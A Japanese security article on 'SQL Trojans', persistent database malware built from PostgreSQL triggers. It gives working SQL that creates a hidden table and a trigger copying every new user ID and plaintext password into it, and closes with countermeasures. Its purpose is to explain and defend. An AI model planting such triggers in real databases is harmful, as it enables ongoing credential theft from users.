@@ -1,0 +1,114 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: SQL Trojan ---
+
+著者：金床
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　SQL Trojanとは、「トリガー」とよばれるデータベースの機能を悪用するマル
+ウェアの一種だ。「トロイ」と呼ばれていることからもわかるように、システム
+内部で密かに動作し、機密データの収集などの活動をおこなう。感染対象はデー
+タベースサーバーとなる。
+　本稿ではとてもシンプルな例を通してこのSQL Trojanについて考察をおこなう。
+なお、以下の解説ではPostgreSQL8.1を用いているが、他のRDBMSなどについても
+同様の原理を用いることが可能だろう。
+
+
+■0x02.) 攻撃対象となるアプリケーションの例
+
+　アプリケーションが次のようなテーブルによってユーザ管理を行っているもの
+とする。
+
+-----
+create table tuser
+(
+id text,
+password text
+);
+-----
+
+　このテーブルにはユーザのIDとパスワードが格納され、主にログインなどの機
+能で利用されるものとする。passwordフィールドには暗号化あるいはハッシュ化
+がおこなわれない、生のパスワードが格納されるものとする。
+
+　例えばこのテーブルの中身は次のようになっている。
+
+-----
+hoge=# select * from tuser;
+    id    | password
+----------+----------
+ Kanatoko | hogefuga
+-----
+
+
+■0x03.) 攻撃の例
+
+　攻撃者はこのデータベースに対し、SQLインジェクションなどを用いて次の一連
+のSQL文を実行する。
+
+-----
+create language plpgsql;
+
+create table p0wn1ch1w4(
+id text,
+password text
+);
+
+create function foo() returns trigger as '
+begin
+  insert into p0wn1ch1w4 values( NEW.id, NEW.password );
+  return new;
+end;
+' language 'plpgsql';
+
+create trigger tg_foo before insert or update or delete on tuser
+  for each row
+  execute procedure foo();
+-----
+
+　まずcreate language文でこのデータベースでストアドプロシージャが作成でき
+るようにする。続いてcreate table文で盗んだデータを格納するためのテーブル
+を作成する（ﾎﾟｳﾝﾆﾁﾜ!）。
+
+　create function文によってfooという関数が作られる。この関数はtuserテーブ
+ルにトリガーとして組み込まれることになる。NEW.idとNEW.passwordはtuserが更
+新される際の新しいレコードの各フィールドを表すもので、つまりtuserが更新さ
+れるたびに新しいﾃﾞｰﾀ（変更、あるいは追加されるもの）がﾎﾟｳﾝﾆﾁﾜﾃｰﾌﾞﾙにinse
+rtされるのだ。
+
+　最後のcreate trigger文によってこの悪意あるｺｰﾄﾞがトリガーとしてtuserﾃｰﾌﾞ
+ﾙに組み込まれることになり、SQL Trojanの感染が完了する。
+
+　攻撃者は一度侵入したデータベースにこのようなSQL Trojanを感染させておく
+ことで、継続的にデータを盗み出すことが可能となる。この例では盗んだデータ
+を取り出すためにはﾎﾟｳﾆﾁﾜﾃｰﾌﾞﾙにｱｸｾｽする必要があるが、実際のｹｰｽではﾌｧｲﾙへ
+の書き出しや名前解決などを利用したﾈｯﾄﾜｰｸ経由での窃取が使用される可能性が
+あるだろう。
+
+
+■0x04.) 対策
+
+　対策を以下に列挙する。
+
+・SQLインジェクションなどの脆弱性を作り込まない
+・データベースやアプリケーションに与える権限を最小限のものにし、トリガー
+やテーブルの作成が行えないようにする
+・定期的にデータベース内を検索し、怪しいテーブルやトリガーが増えていない
+かどうかを確認する
+
+
+■0x05.) まとめ
+
+　SQL Trojanはデータベースに悪意あるトリガーを仕掛けることで一度侵入に成
+功した攻撃者が継続的にデータを盗み出すための仕組みだ。このようなコードは
+アンチウイルスソフトウェアでは検知できないため、独自の対策が必要となるだ
+ろう。
+
+
+
